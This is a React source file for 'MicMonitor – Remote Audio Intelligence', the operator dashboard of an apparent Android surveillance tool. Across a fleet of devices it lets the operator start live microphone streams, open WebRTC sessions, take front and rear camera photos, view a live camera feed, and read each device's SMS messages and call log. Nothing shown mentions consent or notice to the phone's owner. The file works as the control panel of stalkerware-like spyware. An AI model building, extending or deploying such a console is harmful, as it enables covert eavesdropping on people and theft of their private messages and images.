import { useState, useCallback, useEffect, useRef } from 'react';
import { ControlButtons } from './components/dashboard/ControlButtons';
import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel';
import { NetworkProfile } from './components/dashboard/NetworkProfile';
import { SMSPanel } from './components/dashboard/SMSPanel';
import { CallsPanel } from './components/dashboard/CallsPanel';
import { EventLog } from './components/dashboard/EventLog';
import { CameraLiveFeed } from './components/dashboard/CameraLiveFeed';
import { DeviceFleetList } from './components/dashboard/DeviceFleetList';
import { useDashboard } from './hooks/useDashboard';
import { useAudioPlayback } from './hooks/useAudioPlayback';
import { useWebRTC } from './hooks/useWebRTC';
function App() {
  const audioPlayback = useAudioPlayback();
  const webRTC = useWebRTC();

  // Stable refs to avoid re-render loops when these objects change
  const audioPlaybackRef = useRef(audioPlayback);
  audioPlaybackRef.current = audioPlayback;
  const webRTCRef = useRef(webRTC);
  webRTCRef.current = webRTC;
  const [cameraFrame, setCameraFrame] = useState(null);
  const [isCameraLive, setIsCameraLive] = useState(false);
  const [now, setNow] = useState(new Date());

  // Live clock
  useEffect(() => {
    const t = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(t);
  }, []);
  const formatTime = d => d.toLocaleTimeString('en-US', {
    hour12: false,
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  const formatDate = d => d.toLocaleDateString('en-US', {
    weekday: 'short',
    month: 'short',
    day: 'numeric',
    year: 'numeric'
  });
  // CRITICAL: These callbacks must have EMPTY dependency arrays to prevent
  // useDashboard from seeing new function references on every state change,
  // which would cause WebSocket reconnections and command floods.
  const handleAudioData = useCallback((data, deviceId) => {
    audioPlaybackRef.current.feedAudio(data, deviceId);
  }, []);
  const handleWebRTCMessage = useCallback(msg => {
    webRTCRef.current.handleMessage(msg);
  }, []);
  const handleCameraFrame = useCallback(frame => {
    setCameraFrame(frame);
    setIsCameraLive(true);
  }, []);
  const {
    wsState,
    isColdStarting,
    devices,
    selectedDevice,
    selectedDeviceId,
    feed,
    photos,
    setSelectedDeviceId,
    sendCommand
  } = useDashboard(handleAudioData, handleWebRTCMessage, handleCameraFrame);
  const [isListening, setIsListening] = useState(false);
  const isListeningRef = useRef(false);
  const sendCommandRef = useRef(sendCommand);
  sendCommandRef.current = sendCommand;

  const handleCommand = useCallback((cmd, extra) => {
    if (cmd === 'start_stream') {
      audioPlaybackRef.current.start();
      setIsListening(true);
      isListeningRef.current = true;
    } else if (cmd === 'stop_stream') {
      audioPlaybackRef.current.stop();
      setIsListening(false);
      isListeningRef.current = false;
    } else if (cmd === 'webrtc_start') {
      webRTCRef.current.start(sendCommandRef.current);
      return;
    } else if (cmd === 'webrtc_stop') {
      webRTCRef.current.stop(sendCommandRef.current);
      return;
    } else if (cmd === 'camera_live_start') {
      setIsCameraLive(true);
    } else if (cmd === 'camera_live_stop') {
      setIsCameraLive(false);
      setCameraFrame(null);
    }
    sendCommandRef.current(cmd, extra);
  }, []);

  // Ensure audio playback is running while listening (one-shot sync, NOT on every audioPlayback change)
  useEffect(() => {
    if (isListening && !audioPlaybackRef.current.state.isPlaying) {
      audioPlaybackRef.current.start();
    }
  }, [isListening]);

  useEffect(() => {
    audioPlaybackRef.current.setTargetDevice(selectedDeviceId || null);
  }, [selectedDeviceId]);

  // Automatically resend subscriptions if the dashboard reconnects.
  // CRITICAL: Use refs for sendCommand and isListening to avoid re-creating this effect
  // on every state change. This was the primary cause of the 80-commands-per-second flood.
  const wsResubscribedRef = useRef(false);
  useEffect(() => {
    if (wsState === 'open') {
      // Debounce: only resend once per connection event
      if (wsResubscribedRef.current) return;
      wsResubscribedRef.current = true;
      if (isListeningRef.current && selectedDeviceId) {
        // Small delay to let the WS connection stabilize
        const timer = setTimeout(() => {
          sendCommandRef.current('start_stream');
        }, 300);
        return () => clearTimeout(timer);
      }
    } else {
      wsResubscribedRef.current = false;
    }
  }, [wsState, selectedDeviceId]);
  useEffect(() => {
    if (!isCameraLive) {
      const timeout = setTimeout(() => setCameraFrame(null), 3000);
      return () => clearTimeout(timeout);
    }
  }, [isCameraLive]);
  const isWebRtcActive = webRTC.stats.state === 'connected' || webRTC.stats.state === 'connecting';
  const isConnected = wsState === 'open';
  const isStreaming = isListening || audioPlayback.state.isPlaying;
  const health = selectedDevice?.health;
  const selectedDeviceLabel = selectedDevice?.model || 'Unknown device';
  const selectedDeviceShortId = selectedDevice?.deviceId ? selectedDevice.deviceId.slice(0, 8) : null;
  const networkTypeLabel = health?.netType ? String(health.netType).toUpperCase() : 'N/A';
  const qualityLabel = health?.connQuality ? String(health.connQuality).toUpperCase() : 'N/A';
  return <div className="relative min-h-screen overflow-hidden text-zinc-100 bg-zinc-950 font-sans">
      <div className="pointer-events-none absolute inset-0">
        <div className="dashboard-grid-overlay" />
      </div>

      <div className="relative z-10">
        {/* ─── TOP HEADER BAR ─────────────────────────────────────────────────── */}
        <header className="sticky top-0 z-50 px-5 py-3 bg-zinc-950 border-b border-zinc-800">
          <div className="flex items-center justify-between max-w-screen-2xl mx-auto">
            {/* Brand */}
            <div className="flex items-center gap-4">
              <div className="relative">
                <div className="w-10 h-10 rounded-lg flex items-center justify-center font-black text-lg text-black bg-white ring-2 ring-zinc-800">
                  M
                </div>
                {isStreaming && <span className="absolute -top-1 -right-1 w-3 h-3 rounded-full bg-emerald-500 animate-pulse border-2 border-zinc-950" />}
              </div>
              <div>
                <h1 className="text-base font-bold tracking-wide text-zinc-100">MicMonitor</h1>
                <p className="text-[10px] text-zinc-500 uppercase tracking-widest font-semibold">Remote Audio Intelligence</p>
              </div>
            </div>

            {/* Center — stats bar */}
            <div className="hidden md:flex items-center gap-6">
              <StatPill icon="📱" label="Devices" value={devices.length.toString()} color={devices.length > 0 ? '#10b981' : '#64748b'} />
              <StatPill icon="🎙" label="Audio" value={isStreaming ? 'LIVE' : 'IDLE'} color={isStreaming ? '#10b981' : '#64748b'} pulse={isStreaming} />
              <StatPill icon="📶" label="Network" value={health?.lowNetwork ? 'LOW-BW' : 'HQ'} color={health?.lowNetwork ? '#f59e0b' : '#6366f1'} />
              <StatPill icon="🔋" label="Battery" value={health?.batteryPct !== undefined && health.batteryPct !== null ? `${health.batteryPct}%` : '—'} color={health?.batteryPct !== null && health?.batteryPct !== undefined && health.batteryPct < 20 ? '#ef4444' : '#64748b'} />
            </div>

            {/* Right — connection + clock */}
            <div className="flex items-center gap-4">
              <div className="text-right hidden sm:block">
                <div className="text-sm font-mono font-semibold text-white tracking-widest">{formatTime(now)}</div>
                <div className="text-[10px] text-slate-500">{formatDate(now)}</div>
              </div>
              <WsStatusBadge state={wsState} isColdStarting={isColdStarting} />
            </div>
          </div>
        </header>

        {/* Mobile stats strip */}
        <div className="px-5 pt-3 md:hidden">
          <div className="max-w-screen-2xl mx-auto flex items-center gap-2 overflow-x-auto pb-1">
            <StatPill icon="📱" label="Devices" value={devices.length.toString()} color={devices.length > 0 ? '#10b981' : '#64748b'} />
            <StatPill icon="🎙" label="Audio" value={isStreaming ? 'LIVE' : 'IDLE'} color={isStreaming ? '#10b981' : '#64748b'} pulse={isStreaming} />
            <StatPill icon="📶" label="Network" value={health?.lowNetwork ? 'LOW-BW' : 'HQ'} color={health?.lowNetwork ? '#f59e0b' : '#6366f1'} />
            <StatPill icon="🔋" label="Battery" value={health?.batteryPct !== undefined && health.batteryPct !== null ? `${health.batteryPct}%` : '—'} color={health?.batteryPct !== null && health?.batteryPct !== undefined && health.batteryPct < 20 ? '#ef4444' : '#64748b'} />
          </div>
        </div>

        {/* ─── HERO LIVE BAR (when streaming) ─────────────────────────────────── */}
        {isStreaming && <div className="px-5 py-2 bg-emerald-950 border-b border-emerald-900/50">
            <div className="max-w-screen-2xl mx-auto flex items-center gap-3">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                <span className="text-xs font-semibold text-emerald-400 uppercase tracking-wider">Live Audio Stream Active</span>
              </div>
              <div className="flex-1 h-px bg-emerald-900" />
              <LiveBeatBars />
            </div>
          </div>}

        {selectedDevice && <div className="px-5 pt-3">
            <div className="max-w-screen-2xl mx-auto rounded-xl px-4 py-3 md:px-5 md:py-4 bg-zinc-900 border border-zinc-800 shadow-sm">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div>
                  <h2 className="text-xl font-bold flex items-center gap-3 text-zinc-100">
                    <span className="text-2xl">📱</span> {selectedDeviceLabel}
                    {selectedDeviceShortId ? <span className="px-2 py-0.5 rounded-md bg-zinc-800 border border-zinc-700 text-xs font-mono text-zinc-400">
                        {selectedDeviceShortId}
                      </span> : null}
                  </h2>
                  <p className="text-xs text-zinc-400 mt-1">Network {networkTypeLabel} • Link {qualityLabel}</p>
                </div>

                <div className="flex flex-wrap gap-2">
                  <StatusTag label="WS" value={health?.wsConnected === false ? 'Offline' : 'Online'} tone={health?.wsConnected === false ? 'bad' : 'good'} />
                  <StatusTag label="Internet" value={health?.internetOnline === false ? 'Down' : 'Up'} tone={health?.internetOnline === false ? 'bad' : 'good'} />
                  <StatusTag label="Mic" value={health?.micCapturing ? 'Capturing' : 'Idle'} tone={health?.micCapturing ? 'good' : 'neutral'} />
                  <StatusTag label="Camera" value={isCameraLive ? 'Live' : 'Standby'} tone={isCameraLive ? 'warn' : 'neutral'} />
                </div>
              </div>
            </div>
          </div>}

        {/* ─── MAIN CONTENT ────────────────────────────────────────────────────── */}
        <main className="p-4 md:p-5 max-w-screen-2xl mx-auto space-y-5">

        {/* Device Fleet View (Vertical List) */}
        {devices.length > 0 && <DeviceFleetList devices={devices} selectedDeviceId={selectedDeviceId} setSelectedDeviceId={setSelectedDeviceId} />}

        {/* No device placeholder */}
        {devices.length === 0 && <GlassCard className="py-16 text-center">
            <div className="text-6xl mb-4 opacity-30">📡</div>
            <div className="text-lg font-semibold text-slate-300 mb-2">Waiting for device…</div>
            <div className="text-sm text-slate-500">Make sure the Android app is running and connected to the internet.</div>
            <div className="mt-4 flex items-center justify-center gap-2">
              <span className={`w-2 h-2 rounded-full ${isConnected ? 'bg-emerald-400' : 'bg-red-400 animate-pulse'}`} />
              <span className="text-xs text-slate-500">{isConnected ? 'Server connected — listening for devices' : 'Connecting to server…'}</span>
            </div>
          </GlassCard>}

        {/* ── Top row: Network Profile + Device Info ────────────────────────── */}
        {selectedDevice && <>
            {/* Network profile — wide full-width strip */}
            <NetworkProfile lowNetwork={health?.lowNetwork} streamCodec={health?.streamCodec} streamCodecMode={health?.streamCodecMode} onForceToggle={() => handleCommand('set_low_network', {
            enabled: !health?.lowNetwork
          })} isStreaming={isStreaming} connQuality={health?.connQuality} netType={health?.netType} />

            {/* Device info panel + Controls side-by-side on wide screens */}
            <div className="grid grid-cols-1 xl:grid-cols-5 gap-5">
              {/* Device Info — 3/5 */}
              <div className="xl:col-span-3">
                <DeviceInfoPanel device={selectedDevice} audioState={audioPlayback.state} webRTCState={webRTC.stats} />
              </div>
              {/* Controls — 2/5 */}
              <div className="xl:col-span-2">
                <GlassCard>
                  <SectionLabel>Controls</SectionLabel>
                  <ControlButtons onCommand={handleCommand} health={selectedDevice?.health} isStreaming={isStreaming} isWebRtcActive={isWebRtcActive} isCameraLive={isCameraLive} />
                </GlassCard>
              </div>
            </div>

            {/* ── Media row: Camera + SMS + Calls ────────────────────────────── */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
              <CameraLiveFeed frame={cameraFrame} photos={photos} onTakeFront={() => handleCommand('take_photo', { camera: 'front' })} onTakeRear={() => handleCommand('take_photo', { camera: 'rear' })} onStopLive={() => handleCommand('camera_live_stop')} />
              <SMSPanel messages={selectedDevice?.sms || []} />
              <CallsPanel calls={selectedDevice?.calls || []} />
            </div>

            {/* ── Bottom row: Event Log ─────────────────────────── */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
              <EventLog events={feed} />
            </div>
          </>}
        </main>
      </div>
    </div>;
}

// ── Shared sub-components ──────────────────────────────────────────────────────

function GlassCard({
  children,
  className = ''
}) {
  return <div className={`rounded-2xl p-4 ${className}`} style={{
    background: 'linear-gradient(165deg, rgba(13,19,35,0.82), rgba(9,14,25,0.74))',
    border: '1px solid rgba(56,189,248,0.16)',
    backdropFilter: 'blur(14px)',
    boxShadow: '0 12px 36px rgba(0,0,0,0.34), inset 0 1px 0 rgba(148,163,184,0.08)'
  }}>
      {children}
    </div>;
}
function SectionLabel({
  children
}) {
  return <div className="text-[10px] uppercase tracking-widest font-bold text-cyan-300 mb-3 flex items-center gap-2">
      <span className="flex-1 h-px" style={{
      background: 'linear-gradient(90deg, rgba(34,211,238,0.55), transparent)'
    }} />
      {children}
      <span className="flex-1 h-px" style={{
      background: 'linear-gradient(90deg, transparent, rgba(34,211,238,0.55))'
    }} />
    </div>;
}
function StatPill({
  icon,
  label,
  value,
  color,
  pulse = false
}) {
  return <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg" style={{
    background: 'linear-gradient(160deg, rgba(30,41,59,0.55), rgba(15,23,42,0.38))',
    border: '1px solid rgba(71,85,105,0.45)'
  }}>
      <span className="text-sm">{icon}</span>
      <div>
        <div className="text-[9px] uppercase tracking-widest text-slate-500">{label}</div>
        <div className="text-xs font-bold flex items-center gap-1" style={{
        color
      }}>
          {pulse && <span className="w-1.5 h-1.5 rounded-full bg-current animate-pulse" />}
          {value}
        </div>
      </div>
    </div>;
}
function WsStatusBadge({
  state,
  isColdStarting
}) {
  const isWaking = isColdStarting && state === 'connecting';
  const config = {
    open: {
      color: '#10b981',
      bg: 'rgba(16,185,129,0.12)',
      border: 'rgba(16,185,129,0.3)',
      label: 'Connected',
      dot: false
    },
    connecting: {
      color: isWaking ? '#818cf8' : '#f59e0b',
      bg: isWaking ? 'rgba(129,140,248,0.12)' : 'rgba(245,158,11,0.12)',
      border: isWaking ? 'rgba(129,140,248,0.3)' : 'rgba(245,158,11,0.3)',
      label: isWaking ? 'Waking up server (~50s)…' : 'Connecting…',
      dot: true
    },
    closed: {
      color: '#ef4444',
      bg: 'rgba(239,68,68,0.12)',
      border: 'rgba(239,68,68,0.3)',
      label: 'Disconnected',
      dot: true
    }
  }[state] || {
    color: '#64748b',
    bg: 'rgba(100,116,139,0.12)',
    border: 'rgba(100,116,139,0.3)',
    label: state,
    dot: false
  };
  return <div className="flex items-center gap-2 px-3 py-2 rounded-xl text-xs font-semibold whitespace-nowrap" style={{
    background: config.bg,
    border: `1px solid ${config.border}`,
    color: config.color
  }}>
      <span className={`w-2 h-2 rounded-full bg-current ${config.dot ? 'animate-pulse' : ''}`} />
      {config.label}
    </div>;
}
function StatusTag({
  label,
  value,
  tone
}) {
  const palette = {
    good: {
      bg: 'rgba(16,185,129,0.16)',
      border: 'rgba(16,185,129,0.35)',
      color: '#6ee7b7'
    },
    warn: {
      bg: 'rgba(245,158,11,0.16)',
      border: 'rgba(245,158,11,0.35)',
      color: '#fcd34d'
    },
    bad: {
      bg: 'rgba(239,68,68,0.16)',
      border: 'rgba(239,68,68,0.35)',
      color: '#fca5a5'
    },
    neutral: {
      bg: 'rgba(100,116,139,0.16)',
      border: 'rgba(100,116,139,0.35)',
      color: '#cbd5e1'
    }
  };
  const style = palette[tone];
  return <span className="inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wide" style={{
    background: style.bg,
    border: `1px solid ${style.border}`,
    color: style.color
  }}>
      <span className="text-[9px] opacity-70">{label}</span>
      <span>{value}</span>
    </span>;
}
const LIVE_BAR_HEIGHTS = [26, 48, 36, 62, 43, 72, 38, 66, 30, 58, 41, 70];
const LIVE_BAR_DURATIONS = [0.55, 0.64, 0.51, 0.73, 0.58, 0.66, 0.62, 0.74, 0.57, 0.69, 0.61, 0.76];
function LiveBeatBars() {
  return <div className="flex items-end gap-0.5 h-5">
      {LIVE_BAR_HEIGHTS.map((height, i) => <div key={i} className="w-1 rounded-sm" style={{
      height: `${height}%`,
      background: `hsl(${185 + i * 3}, 78%, 58%)`,
      animation: `beatBar ${LIVE_BAR_DURATIONS[i]}s ease-in-out infinite alternate`,
      animationDelay: `${i * 0.07}s`
    }} />)}
      <style>{`
        @keyframes beatBar {
          from { transform: scaleY(0.3); opacity: 0.6; }
          to { transform: scaleY(1); opacity: 1; }
        }
      `}</style>
    </div>;
}
export default App;